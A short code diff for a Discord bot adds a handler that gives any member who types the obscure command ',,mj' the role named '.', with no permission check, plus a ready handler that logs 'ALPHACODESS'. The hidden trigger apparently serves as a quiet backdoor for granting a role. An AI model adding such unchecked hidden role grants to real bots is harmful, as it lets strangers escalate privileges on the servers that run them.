@@ -350,7 +350,17 @@ message.author.send("** [❖═════1play═══════❖]**" + `
 
 
 
+client.on('message', message => {
+  if (message.content.startsWith(',,mj')) {
+     if(!message.channel.guild) return;
+  message.member.addRole(message.guild.roles.find("name", "."));
+ 
+ }
+ });
 
+client.on('ready', () => {
+console.log("ALPHACODESS");
+});
 
 
 
